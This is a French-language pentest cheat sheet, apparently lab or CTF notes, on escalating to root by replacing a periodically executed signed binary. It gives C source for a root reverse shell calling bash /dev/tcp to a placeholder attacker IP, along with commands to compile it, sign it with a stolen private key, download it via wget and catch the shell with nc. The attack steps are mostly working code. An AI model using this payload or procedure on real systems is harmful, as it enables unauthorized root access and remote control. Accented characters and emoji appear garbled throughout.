# SIGNED BINARY EXPLOIT

***

### <mark style="color:red;">üß© Contexte</mark>

* Sur certains syst√®mes **root ex√©cute p√©riodiquement un binaire** (souvent un agent de monitoring, un script de v√©rification, un AV artisanal‚Ä¶).
* Pour √©viter les modifications malveillantes, ce binaire est :
  * **Poss√©d√© par root**.
  * **Contr√¥l√© par un m√©canisme de signature** (log : _Executable not signed. Tampering attempt detected_).
* L‚Äôattaquant doit donc **fabriquer un binaire malveillant** puis **le signer correctement** pour qu‚Äôil soit accept√© et ex√©cut√© par root.

***

### <mark style="color:red;">‚öôÔ∏è √âtapes d‚ÄôExploitation</mark>

#### 1Ô∏è‚É£ D√©tection

* Avec **linpeas**, tu trouves un binaire suspect :

```bash
-rwxrw---- 1 root devs 194 Jul 30 07:40 /opt/AV/periodic-checks/monitor
```

* Ex√©cut√© r√©guli√®rement par root :

```bash
ps aux | grep monitor
root  7551  ...  /opt/AV/periodic-checks/monitor
```

#### 2Ô∏è‚É£ Analyse

* Le fichier est tr√®s petit ‚Üí ELF minimal (probablement un stub).
* Un fichier de logs `status.log` montre un syst√®me de signature :

```
[ERROR] Executable not signed. Tampering attempt detected.
```

* ‚û°Ô∏è On doit g√©n√©rer un **nouveau binaire malveillant sign√©**.

#### 3Ô∏è‚É£ Cr√©ation du binaire malveillant

* Exemple : reverse shell root.

```c
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/<IP>/1337 0>&1", NULL);
    return 0;
}
```

* Compilation statique :

```bash
x86_64-linux-gnu-gcc -o monitor exploit.c -static
```

#### 4Ô∏è‚É£ Signature

* Compilation de l‚Äôoutil signer (ex: `linux-elf-binary-signer`).

```bash
git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git
cd linux-elf-binary-signer
make
```

* Signature avec la cl√© priv√©e r√©cup√©r√©e (`key.pem`) :

```bash
./elf-sign sha256 key.pem key.pem monitor
```

* Binaire sign√© ‚Üí pr√™t √† remplacer celui de root.

#### 5Ô∏è‚É£ D√©ploiement

* Upload via `wget` :

```bash
wget http://<IP>:8000/monitor.1
mv monitor.1 monitor
chmod +x monitor
```

* Attente que root ex√©cute automatiquement le binaire (ou forcer via un script cron/service).

#### 6Ô∏è‚É£ Exploitation

* Lancer listener :

```bash
nc -lnvp 1337
```

* Quand root ex√©cute `monitor` ‚Üí shell root.

***

### <mark style="color:red;">üìö R√©f√©rences</mark>

* [CWE-494: Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)
* [CWE-325: Missing Cryptographic Step (Signature Verification issues)](https://cwe.mitre.org/data/definitions/325.html)
* Exploit pattern : _Signed Binary Replacement ‚Üí Privilege Escalation_

***
